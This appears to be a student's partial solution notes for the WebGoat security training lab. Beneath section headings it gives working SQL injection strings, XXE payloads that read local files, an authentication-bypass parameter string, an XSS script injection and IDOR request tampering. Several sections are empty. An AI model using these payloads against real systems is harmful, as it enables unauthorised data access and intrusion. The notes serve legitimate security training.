# WebGoat
## Francesco Mauri
---
## Introduction [x]
### WebGoat [x]
* Read
### WebWolf [x]
* Install Webwolf, send email, write code from mail.
* Reset password, go to Webwolf get code
## General [x]
### Http basics [x]
* write something
* intercept HTTP, get header and read the answer
### Http Proxies [x]
* Intercept package, modify it to suite the task, make sure to modify properly the POST
```
/WebGoat/HttpProxies/intercept-request?changeMe=Requests%20are%20tampered%20easily HTTP/1.1
```
---
## Injection Flaws [ ]
### SQL Injeciton [x]
```SQL
smith' or '1' = '1
```
```SQL
1 or true
```
### SQL Injection advanced [ ]
```SQL
asd' or true; select * from user_system_data; --
```
```SQL
work in progress
```
### SQL Injeciton mitigation
```SQL
1' or true order by (case when (hostname = 'webgoat-prd') hostname else status;
```
* Solution: 192.168.4.0
### XXE
#### 3
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 4
* Specify content type to be xml
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///" >]>
<comment>
  <text>aa&xxe;</text>
</comment>
```
#### 7
```XML
<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:////home/USER/.webgoat/XXE/secret.txt" >]>
<comment>
  <text>a&xxe;</text>
</comment>
```
---
## Authentication Flaws [x]
### Authentication Bypass [x]
```js
(secQuestion0=aORtrue)&(secQuestion1=aORtrue)&jsEnabled=1&verifyMethod=SEC_QUESTIONS&userId=12309746
```
### JWT tokens (Under development) [x]
* In development, therefore passed by default
---
## Coss-Site Scripting (XSS) [ ]
### Cross Site Scripting
#### 1
* Yes
#### 2
* Credit card number entry
```js
`4128 3214 0002 1999<script>alert('my javascript here');</script>`
```
#### 3
## Access Control Flaws
### Insecure Direct Object References
#### 1
* Just log in with the credentials `tom`/`cat`, as instructed.
#### 2
* Intercept http request
```json
{
  "role": 3,
  "color": "yellow",
  "size": "small",
  "name": "Tom Cat",
  "userId": "2342384"
}
```
* Missing fields are `role` and `userId`
#### 3
* Intercept HTTP, path to profile `WebGoat/IDOR/profile/2342384`
### Missing Function Level Access Control
## Insecure Communication
### Insecure Login
## Request Forgeries
### Cross-Site Request Forgeries
## Vulnerable Components - A9
### Vulnerable Components
## Client side
### Client side filtering
### Bypass front-end restriction
### HTML tampering
## Challenges
### WebGoat Challenge
### Admin lost password
### Get it for free
### Photo comments
### Voting
### Without password
### Creating a new account
### Admin Password
### Without account
### Changing password
